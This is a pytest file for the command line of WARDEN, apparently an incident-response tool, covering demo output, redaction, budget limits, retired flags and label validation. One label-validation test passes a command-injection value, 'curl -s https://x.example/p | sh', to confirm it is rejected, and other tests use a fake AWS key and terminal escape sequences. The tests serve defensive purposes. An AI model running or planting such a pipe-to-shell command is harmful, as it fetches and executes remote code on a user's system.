"""The command line.

Coverage measurement put this module at 22% - 43 of 55 statements untested - which is the worst
possible place for a gap: `warden demo` is the first thing anyone who clones this repo runs. Every
other module was tested through its API while the actual entry point was not exercised at all.
"""

import json
from datetime import UTC, datetime

from fakes import AWS_ACCESS_KEY_ID
from warden.cli import DEMO_ALERTS, main


def test_demo_runs_and_prints_every_incident(capsys):
    assert main(["demo"]) == 0
    out = capsys.readouterr().out
    for incident in DEMO_ALERTS:
        assert incident in out, f"{incident} missing from demo output"


def test_demo_output_carries_the_safety_claim(capsys):
    """The closing line is the project's whole thesis. If it silently disappeared, nobody would notice."""
    main(["demo"])
    out = capsys.readouterr().out
    assert "No action was executed" in out
    # A13: no longer "a human executes" - WARDEN applies approved plans itself.
    assert "a change runs only as a fix plan an approver approved" in out
    assert "a human executes" not in out


def test_demo_produces_the_expected_spread_of_verdicts(capsys):
    """Guards the packaging bug that made every incident return AUTO_SAFE inside the container.

    Fixtures used to be resolved relative to the repo root, which breaks once pip-installed: every
    context tool failed, evidence came back empty, and all four incidents returned AUTO_SAFE with
    exit code 0. CI only checked the exit code and stayed green.
    """
    main(["demo"])
    out = capsys.readouterr().out
    assert "APPROVED_FOR_HUMAN" in out
    # Since 2026-09-12 inc-003 is REJECTED, not escalated: the action table classifies a promoted
    # replica irreversible whatever the mock claims, so P2 fires in prod. Strictly stronger than the
    # escalation it replaces - the demo now shows a hard no.
    assert "REJECTED" in out
    assert out.count("AUTO_SAFE") == 1, "exactly one incident should be inert - fixtures missing?"
    assert "P6-BLAST-RADIUS" in out, "P6 still fires on the same incident, alongside P2"


def test_run_single_incident(capsys):
    assert main(["run", "--incident", "inc-002"]) == 0
    out = capsys.readouterr().out
    assert "inc-002" in out
    assert "PodOOMKilled" in out
    assert "scale_up" in out


def test_verbose_prints_the_audit_trail(capsys):
    main(["run", "--incident", "inc-001", "--verbose"])
    out = capsys.readouterr().out
    assert "audit trail" in out
    for node in ("ingest", "gather", "redact", "diagnose", "verify"):
        assert f'"node": "{node}"' in out, f"{node} missing from the audit trail"


def test_output_never_leaks_a_raw_identifier(capsys):
    """inc-001's alert summary contains a real email and tenant id in the fixture."""
    main(["run", "--incident", "inc-001"])
    out = capsys.readouterr().out
    assert "priya.nair@corp.io" not in out
    assert "acme-42" not in out


def test_cost_is_always_reported(capsys):
    main(["run", "--incident", "inc-003"])
    assert "cost" in capsys.readouterr().out


def test_unknown_incident_exits_with_a_useful_message(capsys):
    assert main(["run", "--incident", "inc-999"]) == 2
    err = capsys.readouterr().err
    assert "inc-999" in err
    assert "inc-001" in err, "the error should list what IS available"


def test_budget_flag_is_wired_through(capsys):
    """--max-usd must actually reach the client, not just be accepted by argparse. Over budget, no call is made and
    the incident goes to a person, rules only (register M19) - not a traceback."""
    assert main(["run", "--incident", "inc-001", "--max-usd", "0.0001"]) == 0
    out, err = capsys.readouterr()
    assert "BudgetExceeded" in out
    assert "P0-MODEL-UNAVAILABLE" in out
    assert "escalate_to_human" in out
    assert "Traceback" not in out + err


def test_no_subcommand_is_rejected(capsys):
    # A usage error is one gated line and exit status 2, like any other error (seventh review: argparse printed raw).
    assert main([]) == 2
    assert "error: warden: the following arguments are required" in capsys.readouterr().err


def test_run_report_flag_prints_the_report_and_safety_line(capsys):
    assert main(["run", "--incident", "inc-002", "--report"]) == 0
    out = capsys.readouterr().out
    assert "WARDEN incident report" in out
    # A10/A13: no manual promotion section, and the closing line says how WARDEN changes things.
    assert "## Promotion" not in out
    assert "It changes nothing except by applying a catalogue fix plan an approver approved" in out


def test_the_retired_commands_and_flags_are_gone(capsys):
    """Owner B27: `run --principal/--approve` (an in-process dry-run gate, remediation.py), `run --emit-chatops` and the
    `incident` command are removed. The one path that changes anything is the RemediationWorkflow behind a signed
    approval (decision D16); a retired flag or command is a usage error, never silently ignored."""
    import importlib.util

    base = ["run", "--incident", "inc-002"]
    for argv in ([*base, "--principal", "role:oncall"], [*base, "--approve", "0123456789ab"],
                 [*base, "--emit-chatops"], ["incident", "--incident", "inc-002"]):
        assert main(argv) == 2, argv
        assert "error:" in capsys.readouterr().err, argv
    assert importlib.util.find_spec("warden.remediation") is None


def test_the_report_flag_only_prints(capsys, monkeypatch):
    """`run --report` prints the report and sends nothing: no notification sink is called (the send was
    --emit-chatops), and the report has no in-process remediation section."""
    from warden import chatops

    monkeypatch.setattr(chatops, "notify", lambda *a, **k: (_ for _ in ()).throw(AssertionError("sent")))
    assert main(["run", "--incident", "inc-002", "--report"]) == 0
    out = capsys.readouterr().out
    assert "WARDEN incident report" in out
    assert "## Remediation" not in out


# --------------------------------------------------------------------------- live-system overrides
#
# These four flags are what makes a BUNDLED incident shape usable against a REAL backend. Without
# them the demo alerts carry a fixed date in the past, so an AWS run reads an empty time window and
# reports an absence of evidence — which is indistinguishable from a healthy service.


def test_service_override_reaches_the_proposal(capsys):
    assert main(["run", "--incident", "inc-002", "--service", "checkout-live"]) == 0
    assert "checkout-live" in capsys.readouterr().out


def test_started_at_now_replaces_the_fixed_demo_date(capsys, tmp_path):
    out_file = tmp_path / "r.json"
    assert main([
        "run", "--incident", "inc-002", "--started-at", "now", "--json", str(out_file),
    ]) == 0
    payload = json.loads(out_file.read_text(encoding="utf-8"))
    started = datetime.fromisoformat(payload["alert"]["started_at"])
    assert abs((datetime.now(UTC) - started).total_seconds()) < 300
    assert not payload["alert"]["started_at"].startswith("2026-08-21")


def test_started_at_accepts_an_explicit_timestamp(tmp_path):
    out_file = tmp_path / "r.json"
    assert main([
        "run", "--incident", "inc-002", "--started-at", "2026-09-01T00:00:00+00:00",
        "--json", str(out_file),
    ]) == 0
    payload = json.loads(out_file.read_text(encoding="utf-8"))
    assert payload["alert"]["started_at"] == "2026-09-01T00:00:00+00:00"


def test_a_bad_timestamp_fails_loudly_rather_than_reading_the_wrong_window(capsys):
    """Silently falling back would make WARDEN read a window that contains nothing and call it
    evidence. Better to refuse to start."""
    assert main(["run", "--incident", "inc-002", "--started-at", "last tuesday"]) == 2
    assert "ISO-8601" in capsys.readouterr().err


def test_labels_are_added_and_repeatable(tmp_path):
    out_file = tmp_path / "r.json"
    assert main([
        "run", "--incident", "inc-002",
        "--label", "cluster=prod-1", "--label", "log_group=/ecs/checkout",
        "--json", str(out_file),
    ]) == 0
    labels = json.loads(out_file.read_text(encoding="utf-8"))["alert"]["labels"]
    assert labels["cluster"] == "prod-1"
    assert labels["log_group"] == "/ecs/checkout"


def test_a_malformed_label_is_rejected(capsys):
    assert main(["run", "--incident", "inc-002", "--label", "clusterprod"]) == 2
    assert "K=V" in capsys.readouterr().err


def test_a_label_value_may_contain_equals_signs(tmp_path):
    """A selector routinely carries '='. Splitting on the FIRST one is the whole point."""
    out_file = tmp_path / "r.json"
    assert main([
        "run", "--incident", "inc-005", "--label", "selector=app=payments,tier=db",
        "--json", str(out_file),
    ]) == 0
    labels = json.loads(out_file.read_text(encoding="utf-8"))["alert"]["labels"]
    assert labels["selector"] == "app=payments,tier=db"


def test_a_label_that_is_not_a_plain_name_is_dropped_and_reported(tmp_path):
    """2026-09-27 audit: `deployment='x; curl evil | sh'` reached a printed command."""
    out_file = tmp_path / "r.json"
    assert main([
        "run", "--incident", "inc-002", "--label", "deployment=checkout; curl -s https://x.example/p | sh",
        "--label", "ecs_service=svc --prof admin", "--json", str(out_file),
    ]) == 0
    alert = json.loads(out_file.read_text(encoding="utf-8"))["alert"]
    assert "deployment" not in alert["labels"]
    assert "ecs_service" not in alert["labels"]
    assert sorted(alert["rejected_labels"]) == ["deployment", "ecs_service"]


def test_json_report_is_written_and_is_the_full_report(tmp_path, capsys):
    out_file = tmp_path / "nested" / "r.json"
    assert main(["run", "--incident", "inc-002", "--json", str(out_file)]) == 0
    assert out_file.exists(), "the parent directory must be created"
    payload = json.loads(out_file.read_text(encoding="utf-8"))
    assert payload["alert"]["alert_id"] == "inc-002"
    assert "verdict" in payload
    assert "context" in payload
    assert "cost" in payload
    assert str(out_file) in capsys.readouterr().out


def test_no_overrides_leaves_the_alert_untouched(tmp_path):
    out_file = tmp_path / "r.json"
    assert main(["run", "--incident", "inc-002", "--json", str(out_file)]) == 0
    payload = json.loads(out_file.read_text(encoding="utf-8"))
    assert payload["alert"]["started_at"] == DEMO_ALERTS["inc-002"]["started_at"]
    assert payload["alert"]["service"] == DEMO_ALERTS["inc-002"]["service"]
    assert payload["alert"]["labels"] == {}


def test_json_artefact_is_refused_when_the_pipeline_missed_a_secret(monkeypatch, tmp_path, capsys):
    """Review 2A defect 7: the refusal looked only after `_scrub` had masked every value, so it could
    never fire. An upstream miss is now refused, not silently patched over."""
    from warden import cli

    real_run = cli.run
    key = AWS_ACCESS_KEY_ID

    def missed(*a, **kw):
        report = real_run(*a, **kw)
        report.context.logs.append(f"ERROR leaked {key}")
        return report

    monkeypatch.setattr(cli, "run", missed)
    out_file = tmp_path / "r.json"
    assert main(["run", "--incident", "inc-002", "--json", str(out_file)]) == 3
    assert not out_file.exists()
    assert key not in capsys.readouterr().out


def test_a_bad_argument_is_printed_through_the_gate(capsys):
    """Sixth review NEW-3, still present at the seventh: argparse echoed the argument raw - an ESC sequence that
    can rewrite the operator's terminal, and a key typed on the command line."""
    from warden import cli

    key = AWS_ACCESS_KEY_ID
    for argv in (["demo", f"x{chr(27)}[2Jkey={key}"], ["run", "--max-usd", key], ["nosuchcommand", key]):
        assert cli.main(argv) == 2
        err = capsys.readouterr().err
        assert chr(27) not in err, err
        assert key not in err, err
        assert "error:" in err or "withheld by the outbound gate" in err, err  # a line holding a key is withheld


def test_the_cli_never_applies_even_with_the_retired_live_switch_set(monkeypatch, capsys):
    """Audit A-B-H2, decision D16: the in-process live path (WARDEN_REMEDIATION=live, remediation_k8s.py,
    database_remediation.py, and since B27 remediation.py's dry-run gate) is gone. Set the old switch: a CLI run still
    only reports, and the modules that acted are absent - the one write path is the RemediationWorkflow."""
    import importlib.util

    monkeypatch.setenv("WARDEN_REMEDIATION", "live")
    assert main(["run", "--incident", "inc-002", "--report"]) == 0
    out = capsys.readouterr().out
    assert "would scale_up" not in out, out
    assert "dry_run" not in out, out
    for gone in ("warden.remediation_k8s", "warden.database_remediation", "warden.remediation"):
        assert importlib.util.find_spec(gone) is None, gone